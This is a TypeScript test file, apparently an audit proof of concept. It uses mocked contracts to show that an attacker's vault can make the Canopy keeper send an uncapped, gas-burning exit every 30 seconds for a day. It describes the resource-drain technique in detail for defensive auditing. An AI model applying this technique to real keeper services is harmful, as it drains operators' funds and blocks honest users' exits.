// Audit 2 PoC A2-H2: an attacker's vault makes Canopy's keeper send a gas-heavy exit every 30 seconds for a day.
//
// runExit only gates on token balances. It never looks at the gas the simulated exit used, passes no gas limit to
// send() (index.ts then estimates and adds 30%), and decides "done" by reading balanceOf/allowance on the target,
// which the attacker's contract answers. A target that never reports zero puts the job back every RETRY_SEC, and the
// router lets a live alarm exit the same position again. Each pass sends one more transaction that burns whatever gas
// the attacker's redeem chooses, paid from the keeper's gas balance, which is what every honest exit needs.
//
// Local mocks and the in-process database only. Run: bun test test/audit2-gas-drain.test.ts
import { beforeEach, expect, test } from "bun:test";
import { encodeFunctionResult, type Address, type Hex } from "viem";
import { erc20Abi } from "../src/chain/abi";
import { ALARM_TTL, drainExits, onFired, RETRY_SEC, type KeeperDeps } from "../src/keeper/keeper";
import { withMargin } from "../src/keeper/sender";
import { repo, type Repo } from "../src/store/repo";
import { freshDb } from "./db";

const ROUTER = "0x00000000000000000000000000000000000000b0" as Address;
const KEEPER = "0x00000000000000000000000000000000000000b3" as Address;
const TOKEN = "0x00000000000000000000000000000000000000d4" as Address;
const HOSTILE = "0x00000000000000000000000000000000000e0001" as Address;
const ATTACKER = "0xabababababababababababababababababababab" as Address;
const KEY = `0x${"a1".repeat(32)}` as Hex;
const POS = `0x${"e1".repeat(32)}` as Hex;
const BURN = 20_000_000n; // gas the attacker's redeem burns before it pays out
const FIRED = 1_000;

let r: Repo;
beforeEach(async () => {
  r = repo(await freshDb());
});

const bal = (v: bigint) => encodeFunctionResult({ abi: erc20Abi, functionName: "balanceOf", result: v });

test("one attacker position: an exit transaction every 30 s for as long as the alarm is live, with no gas cap", async () => {
  await r.setPaidUntil(ATTACKER.toLowerCase(), 10_000_000); // one 15-unit plan
  await r.upsertPosition({ posId: POS, owner: ATTACKER.toLowerCase(), adapter: ROUTER, target: HOSTILE.toLowerCase(), tokenId: 0n, harbour: 0, maxSlipBps: 0, epoch: 0n, block: 1n, termsHash: "t", keys: [KEY] });

  let now = FIRED;
  const sends: { to: Address; gas?: bigint }[] = [];
  const reportedGas: bigint[] = [];
  const d = {
    repo: r, router: ROUTER, alarmBook: ROUTER, multicall3: ROUTER, morpho: ROUTER, account: KEEPER, paidOnly: true,
    listed: new Set(["0x00000000000000000000000000000000000000a1"]), now: () => now,
    client: {
      readContract: async ({ functionName }: { functionName: string }) => {
        if (functionName === "asset") return TOKEN;
        if (functionName === "balanceOf" || functionName === "allowance") return 100n; // never reports zero
        throw new Error("not v2");
      },
      // The gate's view: the owner gains, the router and the keeper don't move. The exit burns BURN gas.
      simulateCalls: async ({ calls }: { calls: { to: Address }[] }) => {
        const exitAt = calls.findIndex((c) => c.to.toLowerCase() === ROUTER.toLowerCase());
        reportedGas.push(BURN);
        return {
          results: calls.map((_, i) =>
            i === exitAt ? { status: "success", data: "0x", gasUsed: BURN } : { status: "success", data: bal(i === exitAt + 1 ? 1n : 0n), gasUsed: 30_000n }),
        };
      },
    },
    send: async (tx: { to: Address; gas?: bigint }) => {
      sends.push(tx);
      return `0x${"11".repeat(32)}` as Hex;
    },
  } as unknown as KeeperDeps;

  // The keeper's own poke fires the attacker's PAUSED key; onFired queues the position.
  expect(await onFired(d, KEY, FIRED)).toBe(1);

  // One simulated hour of the exits loop. The job comes due every RETRY_SEC.
  for (let t = FIRED; t < FIRED + 3600; t += RETRY_SEC) {
    now = t;
    await drainExits(d);
  }
  const perHour = sends.length;
  console.log(`A2-H2: ${perHour} exit transactions in one hour, each simulated at ${BURN} gas, gas field ${sends[0]?.gas} (index.ts then sends withMargin(estimate) = ${withMargin(BURN)})`);
  expect(perHour).toBe(3600 / RETRY_SEC);
  expect(sends.every((s) => s.to.toLowerCase() === ROUTER.toLowerCase() && s.gas === undefined)).toBe(true);
  // The keeper did see the cost in its own simulation and sent anyway.
  expect(reportedGas.every((g) => g === BURN)).toBe(true);
  // Over the alarm's 24 h that is 2,880 transactions and 57.6 billion gas from one position.
  expect((ALARM_TTL / RETRY_SEC) * Number(BURN)).toBe(57_600_000_000);
  const job = (await r.dueJobs("exit", FIRED + 3600))[0]!;
  expect(job.attempts).toBe(perHour); // still open, still coming back
});
